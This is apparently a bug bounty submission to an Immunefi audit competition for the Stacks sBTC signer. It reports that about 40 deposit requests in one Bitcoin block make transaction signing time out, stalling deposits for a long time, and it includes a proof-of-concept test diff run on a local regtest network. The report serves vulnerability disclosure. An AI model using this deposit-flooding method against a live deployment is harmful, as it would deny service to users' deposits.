# #37530 \[BC-Insight] Deposits can be completely DoSed due to incorrect transaction construction

**Submitted on Dec 7th 2024 at 13:59:36 UTC by @n4nika for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #37530
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Network not being able to confirm new transactions (total network shutdown)

## Description

## Note

This issue was found through testing, meaning I show and prove the impact in this issue through a PoC but do not provide a full rootcause analysis. I plan on following up to this issue once that is finished.

## Summary

`utxo.rs::construct_transactions` incorrectly packages deposit transactions always into one big transaction object. This causes the coordinator to always time out if there are more than about `40` deposit requests per bitcoin block. This, in turn, allows an attacker to basically permanently DoS the signers, preventing any deposits.

## Finding Description

In `transaction_coordinator.rs::construct_and_sign_bitcoin_sbtc_transactions`, we call `pending_requests.construct_transactions` to construct a vector of transaction objects we want to get signatures for and submit to Bitcoin. The PoC below shows that, even when we have a lot of deposits, this returns a vector with one very large transaction object.

Since we then iterate over the `transaction_package` we got, trying to sign and submit every transaction, we always do one iteration with a very large transaction (depending on how many deposit requests we currently need to fulfill):

```rs
for mut transaction in transaction_package {
    self.sign_and_broadcast(
        bitcoin_chain_tip,
        aggregate_key,
        signer_public_keys,
        &mut transaction,
    )
    .await?;

    // TODO: if this (considering also fallback clients) fails, we will
    // need to handle the inconsistency of having the sweep tx confirmed
    // but emily deposit still marked as pending.
    self.context
        .get_emily_client()
        .accept_deposits(&transaction, &stacks_chain_tip)
        .await?;
}
```

In `sign_and_broadcast`, we then `coordinate_signing_round`s. These then time out due to the request being too big.

## Impact

This enables an attacker to submit 40 deposit requests in one block and bring the whole system down. Note that 40 deposits in one block can even be reached during completely normal operations!

I want to note that in order for this to be triggered, we need to submit 40 deposits within one block ONCE. This is because when we get the `pending_requests` in `construct_and_sign_bitcoin_sbtc_transactions`, we use the default `context_window` of `10000 blocks`!

This now means that once we reach 40 deposits in one block, the system is DoSed for AT LEAST `10000` blocks which is `~69 days` at an average block time of `10 minutes`. Note that the actual DoS would probably be permanent since we will get more and more deposit requests which just keep on cluttering the database and prolong the downtime of the system indefinitely.

## Mitigation

As far as I saw for now, the rootcause lies in how the `transaction_package` is constructed, meaning that needs to be fixed. As noted in the beginning, I will follow up with an in-depth rootcause analysis.

## Proof of Concept

## PoC

In order to show this please apply this git diff and execute the test with `cargo test --package signer --test integration -- transaction_coordinator::sign_bitcoin_transaction_poc --exact --show-output --ignored --nocapture`.

The PoC does the following:

1. create 40 deposit requests within one btc block
2. run the signing process

We can see that `sign_and_broadcast` returns a timeout error and `RESULT` is `None`, showing that all the deposits failed to execute. (Sometimes the testsuite itself also fails)

```diff
diff --git a/signer/src/transaction_coordinator.rs b/signer/src/transaction_coordinator.rs
index 26afe19c..c4e84e99 100644
--- a/signer/src/transaction_coordinator.rs
+++ b/signer/src/transaction_coordinator.rs
@@ -526,14 +526,17 @@ where
         )
         .await?;
 
+        // println!("transaction_package.len(): {:?}", transaction_package.len());
         for mut transaction in transaction_package {
-            self.sign_and_broadcast(
+            let res = self.sign_and_broadcast(
                 bitcoin_chain_tip,
                 aggregate_key,
                 signer_public_keys,
                 &mut transaction,
             )
-            .await?;
+            .await;
+            println!("res: {:?}", res);
+            res?;
 
             // TODO: if this (considering also fallback clients) fails, we will
             // need to handle the inconsistency of having the sweep tx confirmed
@@ -1260,6 +1263,8 @@ where
         let context_window = self.context_window;
         let threshold = self.threshold;
 
+        println!("CONTEXT WINDOW: {:?}", context_window);
+
         let pending_deposit_requests = self
             .context
             .get_storage()
diff --git a/signer/tests/integration/transaction_coordinator.rs b/signer/tests/integration/transaction_coordinator.rs
index bdf10d7e..c6787579 100644
--- a/signer/tests/integration/transaction_coordinator.rs
+++ b/signer/tests/integration/transaction_coordinator.rs
@@ -23,6 +23,7 @@ use blockstack_lib::net::api::getsortition::SortitionInfo;
 use blockstack_lib::net::api::gettenureinfo::RPCGetTenureInfo;
 use emily_client::apis::deposit_api;
 use emily_client::apis::testing_api;
+use emily_client::models;
 use emily_client::models::CreateDepositRequestBody;
 use fake::Fake as _;
 use fake::Faker;
@@ -1582,6 +1583,365 @@ async fn sign_bitcoin_transaction() {
     }
 }
 
+#[cfg_attr(not(feature = "integration-tests"), ignore)]
+#[tokio::test]
+async fn sign_bitcoin_transaction_poc() {
+    let (_, signer_key_pairs): (_, [Keypair; 3]) = testing::wallet::regtest_bootstrap_wallet();
+    let (rpc, faucet) = regtest::initialize_blockchain();
+
+    // We need to populate our databases, so let's fetch the data.
+    let emily_client =
+        EmilyClient::try_from(&Url::parse("http://localhost:3031").unwrap()).unwrap();
+
+    testing_api::wipe_databases(emily_client.config())
+        .await
+        .unwrap();
+
+    let network = WanNetwork::default();
+
+    let chain_tip_info = rpc.get_chain_tips().unwrap().pop().unwrap();
+
+    // =========================================================================
+    // Step 1 - Create a database, an associated context, and a Keypair for
+    //          each of the signers in the signing set.
+    // -------------------------------------------------------------------------
+    // - We load the database with a bitcoin blocks going back to some
+    //   genesis block.
+    // =========================================================================
+    let mut signers = Vec::new();
+    for kp in signer_key_pairs.iter() {
+        let db_num = DATABASE_NUM.fetch_add(1, Ordering::SeqCst);
+        let db = testing::storage::new_test_database(db_num, true).await;
+        let ctx = TestContext::builder()
+            .with_storage(db.clone())
+            .with_first_bitcoin_core_client()
+            .with_emily_client(emily_client.clone())
+            .with_mocked_stacks_client()
+            .build();
+
+        backfill_bitcoin_blocks(&db, rpc, &chain_tip_info.hash).await;
+
+        let network = network.connect(&ctx);
+
+        signers.push((ctx, db, kp, network));
+    }
+
+    // =========================================================================
+    // Step 2 - Setup the stacks client mocks.
+    // -------------------------------------------------------------------------
+    // - Set up the mocks to that the block observer fetches at least one
+    //   Stacks block. This is necessary because we need the stacks chain
+    //   tip in the transaction coordinator.
+    // - Set up the current-aggregate-key response to be `None`. This means
+    //   that each coordinator will broadcast a rotate keys transaction.
+    // =========================================================================
+    let (broadcast_stacks_tx, rx) = tokio::sync::broadcast::channel(10);
+    let stacks_tx_stream = BroadcastStream::new(rx);
+
+    for (ctx, _db, _, _) in signers.iter_mut() {
+        let broadcast_stacks_tx = broadcast_stacks_tx.clone();
+
+        ctx.with_stacks_client(|client| {
+            client.expect_get_tenure_info().returning(move || {
+                let response = Ok(RPCGetTenureInfo {
+                    consensus_hash: ConsensusHash([0; 20]),
+                    tenure_start_block_id: StacksBlockId([0; 32]),
+                    parent_consensus_hash: ConsensusHash([0; 20]),
+                    parent_tenure_start_block_id: StacksBlockId::first_mined(),
+                    tip_block_id: StacksBlockId([0; 32]),
+                    tip_height: 1,
+                    reward_cycle: 0,
+                });
+                Box::pin(std::future::ready(response))
+            });
+
+            client.expect_get_block().returning(|_| {
+                let response = Ok(NakamotoBlock {
+                    header: NakamotoBlockHeader::empty(),
+                    txs: vec![],
+                });
+                Box::pin(std::future::ready(response))
+            });
+
+            let chain_tip = model::BitcoinBlockHash::from(chain_tip_info.hash);
+            client.expect_get_tenure().returning(move |_| {
+                let mut tenure = TenureBlocks::nearly_empty().unwrap();
+                tenure.anchor_block_hash = chain_tip;
+                Box::pin(std::future::ready(Ok(tenure)))
+            });
+
+            client.expect_get_pox_info().returning(|| {
+                let response = serde_json::from_str::<RPCPoxInfoData>(GET_POX_INFO_JSON)
+                    .map_err(Error::JsonSerialize);
+                Box::pin(std::future::ready(response))
+            });
+
+            client
+                .expect_estimate_fees()
+                .returning(|_, _, _| Box::pin(std::future::ready(Ok(25))));
+
+            // The coordinator will try to further process the deposit to submit
+            // the stacks tx, but we are not interested (for the current test iteration).
+            client.expect_get_account().returning(|_| {
+                let response = Ok(AccountInfo {
+                    balance: 0,
+                    locked: 0,
+                    unlock_height: 0,
+                    // this is the only part used to create the stacks transaction.
+                    nonce: 12,
+                });
+                Box::pin(std::future::ready(response))
+            });
+            client.expect_get_sortition_info().returning(move |_| {
+                let response = Ok(SortitionInfo {
+                    burn_block_hash: BurnchainHeaderHash::from(chain_tip),
+                    burn_block_height: chain_tip_info.height,
+                    burn_header_timestamp: 0,
+                    sortition_id: SortitionId([0; 32]),
+                    parent_sortition_id: SortitionId([0; 32]),
+                    consensus_hash: ConsensusHash([0; 20]),
+                    was_sortition: true,
+                    miner_pk_hash160: None,
+                    stacks_parent_ch: None,
+                    last_sortition_ch: None,
+                    committed_block_hash: None,
+                });
+                Box::pin(std::future::ready(response))
+            });
+
+            // The coordinator broadcasts a rotate keys transaction if it
+            // is not up-to-date with their view of the current aggregate
+            // key. The response of None means that the stacks node does
+            // not have a record of a rotate keys contract call being
+            // executed, so the coordinator will construct and broadcast
+            // one.
+            client
+                .expect_get_current_signers_aggregate_key()
+                .returning(move |_| Box::pin(std::future::ready(Ok(None))));
+
+            // Only the client that corresponds to the coordinator will
+            // submit a transaction so we don't make explicit the
+            // expectation here.
+            client.expect_submit_tx().returning(move |tx| {
+                let tx = tx.clone();
+                let txid = tx.txid();
+                let broadcast_stacks_tx = broadcast_stacks_tx.clone();
+                Box::pin(async move {
+                    broadcast_stacks_tx.send(tx).unwrap();
+                    Ok(SubmitTxResponse::Acceptance(txid))
+                })
+            });
+            // The coordinator will get the total supply of sBTC to
+            // determine the amount of mintable sBTC.
+            client
+                .expect_get_sbtc_total_supply()
+                .returning(move |_| Box::pin(async move { Ok(Amount::ZERO) }));
+        })
+        .await;
+    }
+
+    // =========================================================================
+    // Step 3 - Start the TxCoordinatorEventLoop, TxSignerEventLoop and
+    //          BlockObserver processes for each signer.
+    // -------------------------------------------------------------------------
+    // - We only proceed with the test after all processes have started, and
+    //   we use a counter to notify us when that happens.
+    // =========================================================================
+    let start_count = Arc::new(AtomicU8::new(0));
+
+    for (ctx, _, kp, network) in signers.iter() {
+        let ev = TxCoordinatorEventLoop {
+            network: network.spawn(),
+            context: ctx.clone(),
+            context_window: 10000,
+            private_key: kp.secret_key().into(),
+            signing_round_max_duration: Duration::from_secs(10),
+            bitcoin_presign_request_max_duration: Duration::from_secs(10),
+            threshold: ctx.config().signer.bootstrap_signatures_required,
+            dkg_max_duration: Duration::from_secs(10),
+            sbtc_contracts_deployed: true,
+            is_epoch3: true,
+        };
+        let counter = start_count.clone();
+        tokio::spawn(async move {
+            counter.fetch_add(1, Ordering::Relaxed);
+            ev.run().await
+        });
+
+        let ev = TxSignerEventLoop {
+            network: network.spawn(),
+            threshold: ctx.config().signer.bootstrap_signatures_required as u32,
+            context: ctx.clone(),
+            context_window: 10000,
+            wsts_state_machines: HashMap::new(),
+            signer_private_key: kp.secret_key().into(),
+            rng: rand::rngs::OsRng,
+            dkg_begin_pause: None,
+        };
+        let counter = start_count.clone();
+        tokio::spawn(async move {
+            counter.fetch_add(1, Ordering::Relaxed);
+            ev.run().await
+        });
+
+        let ev = RequestDeciderEventLoop {
+            network: network.spawn(),
+            context: ctx.clone(),
+            context_window: 10000,
+            blocklist_checker: Some(()),
+            signer_private_key: kp.secret_key().into(),
+        };
+        let counter = start_count.clone();
+        tokio::spawn(async move {
+            counter.fetch_add(1, Ordering::Relaxed);
+            ev.run().await
+        });
+
+        let zmq_stream =
+            BitcoinCoreMessageStream::new_from_endpoint(BITCOIN_CORE_ZMQ_ENDPOINT, &["hashblock"])
+                .await
+                .unwrap();
+        let (sender, receiver) = tokio::sync::mpsc::channel(100);
+
+        tokio::spawn(async move {
+            let mut stream = zmq_stream.to_block_hash_stream();
+            while let Some(block) = stream.next().await {
+                sender.send(block).await.unwrap();
+            }
+        });
+
+        let block_observer = BlockObserver {
+            context: ctx.clone(),
+            bitcoin_blocks: ReceiverStream::new(receiver),
+            horizon: 10,
+        };
+        let counter = start_count.clone();
+        tokio::spawn(async move {
+            counter.fetch_add(1, Ordering::Relaxed);
+            block_observer.run().await
+        });
+    }
+
+    while start_count.load(Ordering::SeqCst) < 12 {
+        tokio::time::sleep(Duration::from_millis(10)).await;
+    }
+
+    // =========================================================================
+    // Step 4 - Wait for DKG
+    // -------------------------------------------------------------------------
+    // - Once they are all running, generate a bitcoin block to kick off
+    //   the database updating process.
+    // - After they have the same view of the canonical bitcoin blockchain,
+    //   the signers should all participate in DKG.
+    // =========================================================================
+    let chain_tip: BitcoinBlockHash = faucet.generate_blocks(1).pop().unwrap().into();
+
+    // We first need to wait for bitcoin-core to send us all the
+    // notifications so that we are up to date with the chain tip.
+    let db_update_futs = signers
+        .iter()
+        .map(|(_, db, _, _)| testing::storage::wait_for_chain_tip(db, chain_tip));
+    futures::future::join_all(db_update_futs).await;
+
+    // Now we wait for DKG to successfully complete. For that we just watch
+    // the dkg_shares table. Also, we need to get the signers' scriptPubKey
+    // so that we can make a donation, and get the party started.
+    let dkg_futs = signers
+        .iter()
+        .map(|(_, db, _, _)| testing::storage::wait_for_dkg(db));
+    futures::future::join_all(dkg_futs).await;
+    let (_, db, _, _) = signers.first().unwrap();
+    let shares = db.get_latest_encrypted_dkg_shares().await.unwrap().unwrap();
+
+    // =========================================================================
+    // Step 5 - Prepare for deposits
+    // -------------------------------------------------------------------------
+    // - Before the signers can process anything, they need a UTXO to call
+    //   their own. For that we make a donation, and confirm it. The
+    //   signers should pick it up.
+    // - Give a "depositor" some UTXOs so that they can make a deposit for
+    //   sBTC.
+    // =========================================================================
+    let script_pub_key = shares.aggregate_key.signers_script_pubkey();
+    let network = bitcoin::Network::Regtest;
+    let address = Address::from_script(&script_pub_key, network).unwrap();
+
+    faucet.send_to(100_000, &address);
+
+    let depositor = Recipient::new(AddressType::P2tr);
+
+
+    let ITER = 40;
+
+    // Start off with some initial UTXOs to work with.
+    for _ in 0..ITER {
+        faucet.send_to(50_000_000, &depositor.address);
+        faucet.generate_blocks(1);    
+    }
+    wait_for_signers(&signers).await;
+
+    // =========================================================================
+    // Step 6 - Make a proper deposit
+    // -------------------------------------------------------------------------
+    // - Use the UTXOs confirmed in step (5) to construct a proper deposit
+    //   request transaction. Submit it and inform Emily about it.
+    // =========================================================================
+    // Now lets make a deposit transaction and submit it
+
+    let mut utxos = depositor.get_utxos(rpc, None);
+
+    for _ in 0..ITER {
+        let utxo = utxos.pop().unwrap();
+
+        let amount = 25_000;
+        let signers_public_key = shares.aggregate_key.into();
+        let max_fee = amount / 2;
+        let (deposit_tx, deposit_request, _) =
+            make_deposit_request(&depositor, amount, utxo, max_fee, signers_public_key);
+        rpc.send_raw_transaction(&deposit_tx).unwrap();
+
+
+        assert_eq!(deposit_tx.compute_txid(), deposit_request.outpoint.txid);
+
+        let body = CreateDepositRequestBody {
+            bitcoin_tx_output_index: deposit_request.outpoint.vout,
+            bitcoin_txid: deposit_request.outpoint.txid.to_string(),
+            deposit_script: deposit_request.deposit_script.to_hex_string(),
+            reclaim_script: deposit_request.reclaim_script.to_hex_string(),
+        };
+
+        let _ = deposit_api::create_deposit(emily_client.config(), body.clone())
+        .await
+        .unwrap();
+    }
+    // =========================================================================
+    // Step 7 - Confirm the deposit and wait for the signers to do their
+    //          job.
+    // -------------------------------------------------------------------------
+    // - Confirm the deposit request. This will trigger the block observer
+    //   to reach out to Emily about deposits. It was have one so the
+    //   signers should do basic validations and store the deposit request.
+    // - Each TxSigner process should vote on the deposit request and
+    //   submit the votes to each other.
+    // - The coordinator should submit a sweep transaction. We check the
+    //   mempool for its existance.
+    // =========================================================================
+
+    let chain_tip_: BitcoinBlockHash = faucet.generate_blocks(1).pop().unwrap().into();
+
+    wait_for_signers(&signers).await;
+
+    let (ctx, _, _, _) = signers.first().unwrap();
+
+    let block_hash = faucet.generate_blocks(1).pop().unwrap();
+
+    wait_for_signers(&signers).await;
+
+    let result = signers[0].0.storage.get_latest_sweep_transaction(&chain_tip_, 10000).await.unwrap();
+    println!("RESULT: {:?}", result);
+}
+
+
 /// Check that we do not try to deploy the smart contracts or rotate keys
 /// if we think things are up to date.
 #[cfg_attr(not(feature = "integration-tests"), ignore)]

```
